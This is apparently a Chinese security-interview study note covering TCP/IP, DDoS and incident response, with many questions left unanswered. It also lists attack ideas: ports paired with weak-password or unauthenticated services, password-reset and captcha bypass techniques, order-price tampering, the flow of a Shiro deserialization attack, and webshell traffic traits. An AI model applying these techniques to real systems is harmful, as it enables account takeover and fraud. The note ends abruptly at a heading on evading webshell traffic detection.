<h3 id="问题18：一次完整的HTTP请求过程"><a href="#问题18：一次完整的HTTP请求过程" class="headerlink" title="问题18：一次完整的HTTP请求过程"></a>问题18：一次完整的HTTP请求过程</h3><p><strong>答案：</strong></p>
<h3 id="问题19：HTTPS和HTTP的区别"><a href="#问题19：HTTPS和HTTP的区别" class="headerlink" title="问题19：HTTPS和HTTP的区别"></a>问题19：HTTPS和HTTP的区别</h3><p><strong>答案：</strong></p>
<h3 id="问题20：OSI-的七层模型都有哪些"><a href="#问题20：OSI-的七层模型都有哪些" class="headerlink" title="问题20：OSI 的七层模型都有哪些?"></a>问题20：OSI 的七层模型都有哪些?</h3><p><strong>答案：</strong></p>
<h3 id="问题21：http长连接和短连接的区别"><a href="#问题21：http长连接和短连接的区别" class="headerlink" title="问题21：http长连接和短连接的区别"></a>问题21：http长连接和短连接的区别</h3><p><strong>答案：</strong></p>
<h3 id="问题22：TCP如何保证可靠传输"><a href="#问题22：TCP如何保证可靠传输" class="headerlink" title="问题22：TCP如何保证可靠传输?"></a>问题22：TCP如何保证可靠传输?</h3><p><strong>答案：</strong></p>
<h3 id="问题23：常见的状态码有哪些"><a href="#问题23：常见的状态码有哪些" class="headerlink" title="问题23：常见的状态码有哪些?"></a>问题23：常见的状态码有哪些?</h3><p><strong>答案：</strong></p>
<h3 id="问题24：什么是SSL-https是如何保证数据传输的安全（SSL是怎么工作保证安全的）"><a href="#问题24：什么是SSL-https是如何保证数据传输的安全（SSL是怎么工作保证安全的）" class="headerlink" title="问题24：什么是SSL? https是如何保证数据传输的安全（SSL是怎么工作保证安全的）"></a>问题24：什么是SSL? https是如何保证数据传输的安全（SSL是怎么工作保证安全的）</h3><p><strong>答案：</strong></p>
<h3 id="问题25：如何保证公钥不被篡改"><a href="#问题25：如何保证公钥不被篡改" class="headerlink" title="问题25：如何保证公钥不被篡改?"></a>问题25：如何保证公钥不被篡改?</h3><p><strong>答案：</strong></p>
<h3 id="问题26：php爆绝对路径方法"><a href="#问题26：php爆绝对路径方法" class="headerlink" title="问题26：php爆绝对路径方法?"></a>问题26：php爆绝对路径方法?</h3><p><strong>答案：</strong></p>
<h3 id="问题27：你常用的渗透工具有哪些，最常用的是哪个"><a href="#问题27：你常用的渗透工具有哪些，最常用的是哪个" class="headerlink" title="问题27：你常用的渗透工具有哪些，最常用的是哪个?"></a>问题27：你常用的渗透工具有哪些，最常用的是哪个?</h3><p><strong>答案：</strong></p>
<h3 id="问题28：xss盲打到内网服务器的利用"><a href="#问题28：xss盲打到内网服务器的利用" class="headerlink" title="问题28：xss盲打到内网服务器的利用"></a>问题28：xss盲打到内网服务器的利用</h3><p><strong>答案：</strong></p>
<h3 id="问题29：鱼叉式攻击和水坑攻击"><a href="#问题29：鱼叉式攻击和水坑攻击" class="headerlink" title="问题29：鱼叉式攻击和水坑攻击"></a>问题29：鱼叉式攻击和水坑攻击</h3><p><strong>答案：</strong></p>
<h3 id="问题30：什么是虚拟机逃逸"><a href="#问题30：什么是虚拟机逃逸" class="headerlink" title="问题30：什么是虚拟机逃逸?"></a>问题30：什么是虚拟机逃逸?</h3><p><strong>答案：</strong></p>
<h3 id="问题31：中间人攻击"><a href="#问题31：中间人攻击" class="headerlink" title="问题31：中间人攻击?"></a>问题31：中间人攻击?</h3><p><strong>答案：</strong></p>
<h3 id="问题32：TCP三次握手过程"><a href="#问题32：TCP三次握手过程" class="headerlink" title="问题32：TCP三次握手过程?"></a>问题32：TCP三次握手过程?</h3><p><strong>答案：</strong></p>
<h3 id="问题33：七层模型"><a href="#问题33：七层模型" class="headerlink" title="问题33：七层模型?"></a>问题33：七层模型?</h3><p><strong>答案：</strong></p>
<h3 id="问题34：对于云安全的理解"><a href="#问题34：对于云安全的理解" class="headerlink" title="问题34：对于云安全的理解"></a>问题34：对于云安全的理解</h3><p><strong>答案：</strong></p>
<h3 id="问题35：了解过websocket吗"><a href="#问题35：了解过websocket吗" class="headerlink" title="问题35：了解过websocket吗?"></a>问题35：了解过websocket吗?</h3><p><strong>答案：</strong></p>
<h3 id="问题36：DDOS是什么-有哪些-CC攻击是什么-区别是什么"><a href="#问题36：DDOS是什么-有哪些-CC攻击是什么-区别是什么" class="headerlink" title="问题36：DDOS是什么?有哪些?CC攻击是什么?区别是什么?"></a>问题36：DDOS是什么?有哪些?CC攻击是什么?区别是什么?</h3><p><strong>答案：</strong></p>
<h3 id="问题37：land攻击是什么"><a href="#问题37：land攻击是什么" class="headerlink" title="问题37：land攻击是什么?"></a>问题37：land攻击是什么?</h3><p><strong>答案：</strong> dos攻击中的一种；其 原理是构造数据包，使得源ip与目的ip都是目标ip，让目标机消耗资源。</p>
<h3 id="问题38：你会如何进行信息收集"><a href="#问题38：你会如何进行信息收集" class="headerlink" title="问题38：你会如何进行信息收集?"></a>问题38：你会如何进行信息收集?</h3><p><strong>答案：</strong>一般是收集域名、子域名、旁站、端口及服务、版本漏洞、敏感目录等等。</p>
<blockquote>
<p>svn:3690 svn泄露&#x2F;未授权访问</p>
<p>weblogic:7001 弱口令</p>
<p>6379:redis 一般无认证&#x2F;直接访问</p>
<p>8080:tomcat 弱口令&#x2F;默认口令</p>
<p>8089:jboss 未授权访问&#x2F;弱口令</p>
</blockquote>
<h3 id="问题39：什么是CRLF注入攻击"><a href="#问题39：什么是CRLF注入攻击" class="headerlink" title="问题39：什么是CRLF注入攻击?"></a>问题39：什么是CRLF注入攻击?</h3><p><strong>答案：</strong></p>
<h3 id="问题40：防止XSS，前端后端两个角度"><a href="#问题40：防止XSS，前端后端两个角度" class="headerlink" title="问题40：防止XSS，前端后端两个角度?"></a>问题40：防止XSS，前端后端两个角度?</h3><p><strong>答案：</strong></p>
<h3 id="问题41：如何防护一个端口的安全"><a href="#问题41：如何防护一个端口的安全" class="headerlink" title="问题41：如何防护一个端口的安全?"></a>问题41：如何防护一个端口的安全?</h3><p><strong>答案：</strong></p>
<h3 id="问题42：webshell检测思路"><a href="#问题42：webshell检测思路" class="headerlink" title="问题42：webshell检测思路?"></a>问题42：webshell检测思路?</h3><p><strong>答案：</strong></p>
<h3 id="问题43：GPC是什么-开启了怎么绕过"><a href="#问题43：GPC是什么-开启了怎么绕过" class="headerlink" title="问题43：GPC是什么?开启了怎么绕过"></a>问题43：GPC是什么?开启了怎么绕过</h3><p><strong>答案：</strong></p>
<h3 id="问题44：web常用的加密算法有什么"><a href="#问题44：web常用的加密算法有什么" class="headerlink" title="问题44：web常用的加密算法有什么"></a>问题44：web常用的加密算法有什么</h3><p><strong>答案：</strong></p>
<h3 id="问题45：XSS除了获取cookies还能做什么"><a href="#问题45：XSS除了获取cookies还能做什么" class="headerlink" title="问题45：XSS除了获取cookies还能做什么?"></a>问题45：XSS除了获取cookies还能做什么?</h3><p><strong>答案：</strong></p>
<p> rip协议是什么? rip的工作原理</p>
<h3 id="问题46：运营商（或其他）网络劫持"><a href="#问题46：运营商（或其他）网络劫持" class="headerlink" title="问题46：运营商（或其他）网络劫持"></a>问题46：运营商（或其他）网络劫持</h3><h1 id="APT原理"><a href="#APT原理" class="headerlink" title="APT原理"></a>APT原理</h1><p>APT（高级持续性威胁）的原理是通过利用先进的技术和技巧，对目标系统和网络进行长期、隐蔽的攻击，从而获取机密信息、控制系统或进行破坏。</p>
<p>APT攻击通常包括以下几个步骤：</p>
<ol>
<li>针对目标进行信息搜集：攻击者通过各种手段（如扫描、社会工程学等）获取目标机器和网络的信息，包括系统漏洞、安全配置、网络拓扑结构、用户信息等。</li>
<li>利用漏洞进行入侵：攻击者利用先进的攻击技术（如零日漏洞、木马程序、社会工程学攻击等）对目标系统进行入侵。</li>
<li>建立控制通道：攻击者通过植入恶意程序或利用合法的系统服务建立控制通道，以便后续的攻击。</li>
<li>滞留攻击：攻击者在网络中长期滞留，不断地搜集信息、寻找新的漏洞和攻击机会。</li>
<li>数据窃取或破坏：一旦攻击者获得所需的信息或控制权，就可能对目标系统和网络进行数据窃取或破坏。</li>
</ol>
<p>APT的攻击过程通常需要长达数月至数年的时间，攻击者极为隐蔽，很难被发现和防范。因此，APT被认为是一种非常危险的网络攻击形式。</p>
<h1 id="二、计网"><a href="#二、计网" class="headerlink" title="二、计网"></a>二、计网</h1><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619125601482.png"></p>
<p>TCP头部格式，重要部分：</p>
<blockquote>
<p><strong>序列号</strong>：在建立连接时由计算机生成的随机数作为其初始值，通过 SYN 包传给接收端主机，每发送一次数据，就「累加」一次该「数据字节数」的大小。<strong>用来解决网络包乱序问题。</strong></p>
<p><strong>确认应答号</strong>：指下一次「期望」收到的数据的序列号，发送端收到这个确认应答以后可以认为在这个序号以前的数据都已经被正常接收。<strong>用来解决不丢包的问题。</strong></p>
<p><strong>控制位：</strong></p>
<ul>
<li><em>ACK</em>：该位为 <code>1</code> 时，「确认应答」的字段变为有效，TCP 规定除了最初建立连接时的 <code>SYN</code> 包之外该位必须设置为 <code>1</code> 。</li>
<li><em>RST</em>：该位为 <code>1</code> 时，表示 TCP 连接中出现异常必须强制断开连接。</li>
<li><em>SYC</em>：该位为 <code>1</code> 时，表示希望建立连，并在其「序列号」的字段进行序列号初始值的设定。</li>
<li><em>FIN</em>：该位为 <code>1</code> 时，表示今后不会再有数据发送，希望断开连接。当通信结束希望断开连接时，通信双方的主机之间就可以相互交换 <code>FIN</code> 位置为 1 的 TCP 段。</li>
</ul>
</blockquote>
<p>TCP 是<strong>面向连接的、可靠的、基于字节流</strong>的传输层通信协议。</p>
<blockquote>
<ul>
<li><strong>面向连接</strong>：一定是「一对一」才能连接，不能像 UDP 协议 可以一个主机同时向多个主机发送消息，也就是一对多是无法做到的；</li>
<li><strong>可靠的</strong>：无论的网络链路中出现了怎样的链路变化，TCP 都可以保证一个报文一定能够到达接收端；</li>
<li><strong>字节流</strong>：消息是「没有边界」的，所以无论我们消息有多大都可以进行传输。并且消息是「有序的」，当「前一个」消息没有收到的时候，即使它先收到了后面的字节已经收到，那么也不能扔给应用层去处理，同时对「重复」的报文会自动丢弃。</li>
</ul>
</blockquote>
<p>TCP连接是什么？</p>
<blockquote>
<p>建立一个 TCP 连接是需要客户端与服务器端达成以下三个信息的共识。</p>
<ul>
<li><strong>Socket</strong>：由 IP 地址和端口号组成</li>
<li><strong>序列号</strong>：用来解决乱序问题等</li>
<li><strong>窗口大小</strong>：用来做流量控制</li>
</ul>
</blockquote>
<p>唯一确定一个 TCP 连接</p>
<blockquote>
<p>靠四元组。即</p>
<ul>
<li>源地址</li>
<li>源端口</li>
<li>目的地址</li>
<li>目的端口</li>
</ul>
</blockquote>
<p>TCP的出现是因为：</p>
<blockquote>
<p>IP 层是「不可靠」的，它不保证网络包的交付、不保证网络包的按序交付、也不保证网络包中的数据的完整性。</p>
<p>而 TCP 是一个工作在<strong>传输层</strong>的<strong>可靠</strong>数据传输的服务，它能确保接收端接收的网络包是<strong>无损坏、无间隔、非冗余和按序的。</strong></p>
</blockquote>
<p>有一个 IP 的服务器监听了一个端口，它的 TCP 的最大连接数&#x3D;客户端的IP数*客户端的端口数</p>
<blockquote>
<p>对 IPv4，客户端的 IP 数最多为 <code>2</code> 的 <code>32</code> 次方，客户端的端口数最多为 <code>2</code> 的 <code>16</code>次方</p>
</blockquote>
<p>当然由于<strong>文件描述符限制</strong>和<strong>内存限制</strong>，最大连接数不会达到理想状态</p>
<p>UDP与TCP区别</p>
<blockquote>
<p><em>1. 连接</em></p>
<ul>
<li><strong>TCP 是面向连接</strong>的传输层协议，传输数据前先要建立连接。</li>
<li>UDP 是不需要连接，即刻传输数据。</li>
</ul>
<p><em>2. 服务对象</em></p>
<ul>
<li><strong>TCP 是一对一</strong>的两点服务，即一条连接只有两个端点。</li>
<li>UDP 支持一对一、一对多、多对多的交互通信</li>
</ul>
<p><em>3. 可靠性</em></p>
<ul>
<li>TCP 是可靠交付数据的，数据可以无差错、不丢失、不重复、按需到达。</li>
<li><strong>UDP 是尽最大努力交付</strong>，不保证可靠交付数据。</li>
</ul>
<p><em>4. 拥塞控制、流量控制</em></p>
<ul>
<li><strong>TCP 有拥塞控制和流量控制机制</strong>，保证数据传输的安全性。</li>
<li>UDP 则没有，即使网络非常拥堵了，也不会影响 UDP 的发送速率。</li>
</ul>
<p><em>5. 首部开销</em></p>
<ul>
<li><strong>TCP 首部长度较长，会有一定的开销</strong>，首部在没有使用「选项」字段时是 <code>20</code> 个字节，如果使用了「选项」字段则会变长的。</li>
<li><strong>UDP 首部只有 8 个字节</strong>，并且是固定不变的，开销较小。</li>
</ul>
</blockquote>
<p>由于 TCP 是面向连接，能保证数据的<strong>可靠性交付</strong>，因此经常用于：</p>
<ul>
<li><code>FTP</code> 文件传输</li>
<li><code>HTTP</code> &#x2F; <code>HTTPS</code></li>
</ul>
<p>由于 UDP 面向无连接，它可以<strong>随时发送数据</strong>，再加上UDP本身的处理既简单又高效，因此经常用于：</p>
<ul>
<li>包总量较少的通信，如 <code>DNS</code> 、<code>SNMP</code> 等</li>
<li>视频、音频等多媒体通信</li>
<li>广播通信</li>
</ul>
<p>TCP为什么是三次握手</p>
<blockquote>
<ul>
<li>三次握手才可以阻止历史重复连接的初始化（主要原因）</li>
<li>三次握手才可以同步双方的初始序列号</li>
<li>三次握手才可以避免资源浪费</li>
</ul>
</blockquote>
<p>客户端连续发送多次 SYN 建立连接的报文，在网络拥堵等情况下：</p>
<ul>
<li>一个「旧 SVN 报文」比「最新的 SYN 」 报文早到达了服务端；</li>
<li>那么此时服务端就会回一个 <code>SYN + ACK</code> 报文给客户端；</li>
<li>客户端收到后可以根据自身的上下文，判断这是一个历史连接（序列号过期或超时），那么客户端就会发送 <code>RST</code> 报文给服务端，表示中止这一次连接。</li>
</ul>
<p>如果是两次握手连接，就不能判断当前连接是否是历史连接，三次握手则可以在客户端（发送方）准备发送第三次报文时，客户端因有足够的上下文来判断当前连接是否是历史连接：</p>
<ul>
<li>如果是历史连接（序列号过期或超时），则第三次握手发送的报文是 <code>RST</code> 报文，以此中止历史连接；</li>
<li>如果不是历史连接，则第三次发送的报文是 <code>ACK</code> 报文，通信双方就会成功建立连接；</li>
</ul>
<p>总之</p>
<blockquote>
<ul>
<li>「两次握手」：无法防止历史连接的建立，会造成双方资源的浪费，也无法可靠的同步双方序列号；</li>
<li>「四次握手」：三次握手就已经理论上最少可靠连接建立，所以不需要使用更多的通信次数。</li>
</ul>
</blockquote>
<p>IP 层会分片，为什么 TCP 层还需要 MSS ？</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619131302011.png"></p>
<p>IP层本身没有超时重传机制，TCP才有。如果整个(TCP头部+TCP数据)交给IP层分片，当其中一个IP片丢失，整个IP报文都得重传。</p>
<p>为了达到最佳的传输效能 ，TCP 协议就通过MSS切片、重传，效率很高。</p>
<p>SYN 攻击</p>
<blockquote>
<p>TCP 连接建立是需要三次握手，假设攻击者短时间伪造不同 IP 地址的 <code>SYN</code> 报文，服务端每接收到一个 <code>SYN</code> 报文，就进入<code>SYN_RCVD</code> 状态，但服务端发送出去的 <code>ACK + SYN</code> 报文，无法得到未知 IP 主机的 <code>ACK</code> 应答，久而久之就会<strong>占满服务端的 SYN 接收队列（未连接队列）</strong>，使得服务器不能为正常用户服务。</p>
</blockquote>
<p>避免方法</p>
<blockquote>
<p>1.控制SYN_RCVD 状态连接的最大个数，超出时丢弃。</p>
<p>2.SYN队列占满，则启动cookie，net.ipv4.tcp_syncookies &#x3D; 1</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s/lFnyBaaP3f0eNcKGW5RtCg">图解TCP</a></p>
<h1 id="补充1"><a href="#补充1" class="headerlink" title="补充1"></a>补充1</h1><h2 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h2><p>js，目的是前端验证；是一门解释性语言、动态语言；类似于c和java的语法结构、严格区分大小写、基于原型的面向对象。</p>
<p><strong>使用方式：</strong></p>
<ul>
<li>标签引用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;  alert(&quot;Hello,World!&quot;); &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>文件引用 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main.html中：</span><br><span class="line">&lt;script src=&quot;main.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">而main.js:</span><br><span class="line">alert(&quot;Hello,World!&quot;);</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>输出：</strong></p>
<p>1.f12的控制台</p>
<blockquote>
<p>consloe.log(“日志”)&#x2F;info&#x2F;warn</p>
</blockquote>
<h1 id="补充2"><a href="#补充2" class="headerlink" title="补充2"></a>补充2</h1><h2 id="找回密码的地方，存在的漏洞？"><a href="#找回密码的地方，存在的漏洞？" class="headerlink" title="-找回密码的地方，存在的漏洞？"></a>-找回密码的地方，存在的漏洞？</h2><p>1.用户凭证暴力破解<br>1.1 密码找回的凭证太弱，如只需要填入一个四位或者六位的纯数字，就可以重置密码，导致可以暴力破解。</p>
<p>2.返回凭证<br>2.1 url返回验证码及token（找回密码凭证发到邮箱中，url中包含用户信息以及凭证，但是这个凭证可以重置任何用户）</p>
<p>2.2 密码找回凭证在页面中（通过密保问题找回密码、找回密码的答案在网页的源代码中）</p>
<p>2.3 返回短信验证码</p>
<p>（抓包更改）</p>
<p>3.邮箱弱token<br>3.1 时间戳的md5（Unix时间戳）<br>3.2 用户名<br>3.3 服务器时间</p>
<p>4.用户凭证有效性<br>4.1 短信验证码<br>4.2 邮箱token<br>4.3 重置密码token</p>
<p>5.重新绑定<br>5.1 手机绑定（任意用户绑上自己可控的安全手机，就可以重置任意人的手机号码了）<br>5.2 邮箱绑定</p>
<p>6.服务器验证<br>6.1 最终提交步骤<br>6.2 服务器验证可控内容（在最后重置密码处跟随一个用户ID，改成其他用户ID，即可把其他用户改成你刚刚设置的密码）<br>6.3 服务器验证逻辑为空</p>
<p>7.用户身份验证<br>7.1 账号与手机号码的绑定<br>7.2 账号与邮箱账号的绑定</p>
<p>8.找回步骤<br>8.1 跳过验证步骤、找回方式，直接到设置新密码页面</p>
<p>9.本地验证<br>9.1 在本地验证服务器的返回信息，确定是否执行重置密码，但是其返回的信息是可控的内容，或者可以得到的内容（密码找回凭证在客户端获取，在密码找回时注意抓包查看所有url返回响应等，看是否有最终的凭证出现，这样就可以绕过手机或者安全邮箱了）<br>9.2 发送短信等验证信息的动作在本地进行，可以通过修改返回包进行控制</p>
<p>10.注入<br>10.1 在找回密码出存在注入漏洞</p>
<p>11.Token生成<br>11.1 Token生成可控</p>
<p>12.注册覆盖<br>12.1 注册重复的用户名（比如注册A，返回用户已存在，把已存在的状态修改为可注册，填写信息提交注册，就可以覆盖A账号）</p>
<p>13.session覆盖</p>
<p>————————————————<br>版权声明：本文为CSDN博主「ihszg」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_45663905/article/details/108429837">https://blog.csdn.net/weixin_45663905/article/details/108429837</a></p>
<p>手机号找回密码，但是验证次数频繁会限制，</p>
<p>尝试在手机号后面添加不为数字的字符，查看是否过滤</p>
<h2 id="订单信息的逻辑漏洞"><a href="#订单信息的逻辑漏洞" class="headerlink" title="订单信息的逻辑漏洞"></a>订单信息的逻辑漏洞</h2><p>越权</p>
<p>改参数:</p>
<blockquote>
<p>低级分换取高积分商品：选取低级分礼物兑换，提交抓包，改编号为高积分</p>
<p>支付页面的金额、数量(负数)</p>
</blockquote>
<h2 id="http传输过程中存在的安全隐患"><a href="#http传输过程中存在的安全隐患" class="headerlink" title="http传输过程中存在的安全隐患"></a>http传输过程中存在的安全隐患</h2><p>明文传输；</p>
<p>篡改</p>
<h2 id="会员系统漏洞"><a href="#会员系统漏洞" class="headerlink" title="会员系统漏洞"></a>会员系统漏洞</h2><p>个人中心的xss、修改信息</p>
<h2 id="js在漏洞挖掘中的作用"><a href="#js在漏洞挖掘中的作用" class="headerlink" title="js在漏洞挖掘中的作用"></a>js在漏洞挖掘中的作用</h2><p>js自带敏感信息泄露</p>
<p>有加密时，使用参数解密</p>
<h2 id="空白页面测试"><a href="#空白页面测试" class="headerlink" title="空白页面测试"></a>空白页面测试</h2><p>改UA、Referer、请求方式等等，fuzz目录</p>
<h2 id="内敛注释"><a href="#内敛注释" class="headerlink" title="内敛注释"></a>内敛注释</h2><p>sql注入中的绕过方式，利用注释符号，把要使用的查询语句放在&#x2F;*。。。*&#x2F;中，这样在一般的数据库是不会执行的，但是在mysql中内联注释中的语句会被执行。</p>
<blockquote>
<p>SQL查询在执行之前，通常会经过一个解析器来分析语法和结构。解析器会根据SQL语法规则对输入进行解析，并识别出关键字、表名、列名等元素。</p>
<p>内联注释在SQL注入中有效的原因是因为它能够绕过语法解析器对注释内容的处理。SQL查询在执行之前，通常会经过一个解析器来分析语法和结构。解析器会根据SQL语法规则对输入进行解析，并识别出关键字、表名、列名等元素。</p>
<p>然而，解析器对注释的处理方式是将注释内容完全忽略，不会将其视为SQL代码的一部分。这为攻击者提供了一种机会，利用注释符号将恶意代码嵌入SQL语句中，并确保其在语法解析阶段不会引发错误。</p>
</blockquote>
<p>例子，万能密码，就是利用了内联注释。</p>
<h2 id="验证码爆破"><a href="#验证码爆破" class="headerlink" title="验证码爆破"></a>验证码爆破</h2><ul>
<li>验证码暴力破解<ul>
<li>工具<ul>
<li><code>Burpsuite</code></li>
<li><code>Hydra</code></li>
</ul>
</li>
</ul>
</li>
<li>验证码时间、次数测试<ul>
<li>重复提交携带验证码的数据包，查看返回包，判断次数</li>
</ul>
</li>
<li>验证码客户端回显测试<ul>
<li>抓包测试，是否有回显，验证码是否会被返回</li>
</ul>
</li>
<li>验证码绕过测试<ul>
<li>抓包，删除验证码字段，查看是否可以成功发送</li>
<li>抓包，正常流程下，记录验证码后的数据包，替换目标包中内容，直接发送，查看是否可以直接绕过验证码</li>
</ul>
</li>
</ul>
<h2 id="csrf-xss-xxe"><a href="#csrf-xss-xxe" class="headerlink" title="csrf\xss\xxe"></a>csrf\xss\xxe</h2><p>xss:跨站脚本攻击，将输入构造成恶意代码，执行时，会实现窃取用户信息等攻击</p>
<p>修复：实体字符转义、htttponly 禁止js读取cookie、输入时校验、浏览器与we应用端采用相同字符编码</p>
<p>csrf：跨站请求伪造攻击</p>
<p>修复：token、二次密码referer校验</p>
<p>xxe:xml外部实体攻击</p>
<p>修复：xml解析库在调用时严格禁止对外部实体解析</p>
<h2 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h2><p>java中的objectoutputstram类的writeobject()方法实现序列化，将对象转化成字节流，便于保存和传输</p>
<h2 id="shiro反序列化"><a href="#shiro反序列化" class="headerlink" title="shiro反序列化"></a>shiro反序列化</h2><p>apache shrio提供的remember功能，用户登录成功会生成加密并编码的cookie。服务器对此的处理方式是，获取cookie-&gt;base64解码-&gt;aes解密-&gt;反序列化校验</p>
<p>漏洞利用：aes密钥已知，将恶意代码进行序列化-&gt;加密-&gt;base64编码，形成新cookie。让服务器解析</p>
<h2 id="ips和ids区别"><a href="#ips和ids区别" class="headerlink" title="ips和ids区别"></a>ips和ids区别</h2><p>​	ips:入侵防御系统，一个安全设施，监视网络及设备网络资料传输行为，即时中断、调整异常传输行为。位于防火墙和网络设备之间。具有检测已知和未知攻击并具有成功防止攻击的能力</p>
<p>ids：入侵检测系统，部署在网络内部，对内部攻击无能为力，无法反击网络攻击。（基于数据包嗅探技术）</p>
<h1 id="建立隧道"><a href="#建立隧道" class="headerlink" title="建立隧道"></a>建立隧道</h1><p>一个口子，从外网到内部，即端口转发。</p>
<p>将内网靶机的xxxx:3389端口转发到边界机的yyyy:8888端口；远程连接边界机</p>
<h2 id="shell-x2F-webshell"><a href="#shell-x2F-webshell" class="headerlink" title="shell&#x2F;webshell"></a>shell&#x2F;webshell</h2><p>shell:</p>
<blockquote>
<p>1.主机的管理员权限(powershell&#x2F;root) </p>
<p>或</p>
<ol start="2">
<li>交互接口，如windows的cmd与linux的终端</li>
</ol>
</blockquote>
<p>webshell:后门，木马</p>
<h2 id="三种业务逻辑漏洞，以及修复方式"><a href="#三种业务逻辑漏洞，以及修复方式" class="headerlink" title="三种业务逻辑漏洞，以及修复方式"></a>三种业务逻辑漏洞，以及修复方式</h2><p>密码找回：密码可以暴力破解、通用型凭证比较简单、跳过验证步骤、找回凭证可以拦截等方式得到</p>
<p>身份认证：cookie仿冒、会话固定攻击（得到session）</p>
<p>验证漏洞：验证码暴力破解、重复利用、改包绕过等。</p>
<h2 id="xss钓鱼"><a href="#xss钓鱼" class="headerlink" title="xss钓鱼"></a>xss钓鱼</h2><p>xss通过脚本文件获取用户的cookie，加入 cookie，用 referer 来提交，无需输入帐号密码直接登录进去</p>
<h2 id="syn攻击"><a href="#syn攻击" class="headerlink" title="syn攻击"></a>syn攻击</h2><p>客户端在短时间内伪造大量不存在的 IP 地址，向服务器不断地发送 syn 包，服务器回复确认包，并等待客户的确认，由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造 的 SYN 包将长时间占用未连接队列，正常的 SYN 请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。 </p>
<h1 id="三、爬虫"><a href="#三、爬虫" class="headerlink" title="三、爬虫"></a>三、爬虫</h1><p>目的是访问网页，提取感兴趣的内容并保存</p>
<p>流程：</p>
<p>1.先访问默认url，发出http请求</p>
<p>2.接收响应内容，解析html结构，提取目标字段</p>
<p>3.查找网页中的链接，放入待访问队列</p>
<p>4.提取出访问队列的一个url，并发出http请求</p>
<p>5.重复2,3步骤</p>
<h2 id="反爬虫"><a href="#反爬虫" class="headerlink" title="反爬虫"></a>反爬虫</h2><p>robots.txt 指定了可以爬虫的url。</p>
<p>ua检测:可能使用默认或自定义的User-Agent标识</p>
<p>ip的频率限制</p>
<p>验证码验证</p>
<h1 id="四、风险评估"><a href="#四、风险评估" class="headerlink" title="四、风险评估"></a>四、风险评估</h1><p>三要素：</p>
<blockquote>
<p>资产：资产价值</p>
<p>威胁：威胁主体、影响对象、出现频率、动机等</p>
<p>脆弱性：资产弱点的严重程度</p>
</blockquote>
<p>准备阶段：资产识别、威胁识别、脆弱性识别</p>
<p>已有安全措施的确认</p>
<p>风险识别：</p>
<p>​	风险计算-&gt;</p>
<h1 id="五、应急响应"><a href="#五、应急响应" class="headerlink" title="五、应急响应"></a>五、应急响应</h1><p>PDCERF模型</p>
<ul>
<li>Prepare（准备）：准备用来检测的工具和人</li>
<li>Detection（检测）：紧急事件监测：包括防火墙、系统、web服务器、IDS&#x2F;WAF&#x2F;SIEM中的日志，不正常或者是执行了越权操作的用户，甚至还有管理员的报告</li>
<li>Containment（抑制）：首先先控制受害范围，不要让攻击的影响继续蔓延到其他的IT资产和业务环境，切记不要直接一股脑的投入全部精力到封堵后门。紧接着要做的是去寻找根源原因，彻底解决，封堵攻击源，把业务恢复到更张水平</li>
<li>Eradication（根除）</li>
<li>Recover（恢复）</li>
<li>Follow-Up（跟踪）：根据各种监控去确定没有其他的攻击行为和攻击向量，紧接着就是开会反省此次事件，写报告，持续改进工作流程和工作缓解</li>
</ul>
<h1 id="六、DDOS"><a href="#六、DDOS" class="headerlink" title="六、DDOS"></a>六、DDOS</h1><p>最基本的攻击方式：利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应。</p>
<p>被攻击的服务器有以下症状：1、被攻击主机上有大量等待的TCP连接；2、网络中充斥着大量的无用的数据包，源地址为假；3、制造高流量无用数据，造成网络拥塞，使受害主机无法正常和外界通讯；4、利用受害主机提供的服务或传输协议上的缺陷，反复高速的发出特定的服务请求，使受害主机无法及时处理所有正常请求；5、严重时会造成系统死机</p>
<p>防御预案：</p>
<ul>
<li>网络设备设施<ul>
<li>拼带宽，加大带宽，但是成本太高</li>
<li>使用硬件防火墙</li>
<li>选用高性能设备</li>
</ul>
</li>
<li>抗D思想和方案<ul>
<li>负载均衡：分流</li>
<li>花钱买流量清洗服务</li>
<li>CDN：web层，比如cc攻击：分流</li>
<li>限制连接和请求</li>
<li>分布式集群防御</li>
<li>高防：防大部分攻击，udp、大型的cc攻击</li>
</ul>
</li>
<li>预防为主<ul>
<li>系统漏洞</li>
<li>系统资源优化：</li>
<li>过滤不必要的服务和端口</li>
<li>限制特定流量：检查访问来源做适当限制</li>
</ul>
</li>
</ul>
<h1 id="七、webshell"><a href="#七、webshell" class="headerlink" title="七、webshell"></a>七、webshell</h1><p>webshell客户端 用于webshell后门和攻击者之间的通信程序，我们可以通过webshell客户端的流量来判断服务器上是否存在Webshell后门。</p>
<h2 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h2><p><strong>中国菜刀</strong>：流量特征比较明显，2011,2014版本中，流量中有的php代码，asp代码是明文形式，jsp代码有固定格式，容易被检测出来。2016版本隐蔽性增强，对php，asp代码增加了混淆，还对ASP代码进行了unicode编码</p>
<p><strong>蚁剑</strong>：可以对流量进行加密、混淆。但是有些关键代码没有被加密，如：PHP中的ini_set；ASP中的OnError，response等</p>
<p>蚁剑PHP类WebShell链接流量：</p>
<p>对php中的某些代码没有加密，例如ini_set，set_time_limit。比较容易被识别</p>
<p>蚁剑ASP类WebShell：</p>
<p>OnError ResumeNext，response等没有被加密，是明文的形式，比较容易识别</p>
<p>execute在蚁剑中被打断混淆了，变成了拼接形式Ex”&amp;cHr(101)&amp;”cute</p>
<p>蚁剑绕过特征流量：</p>
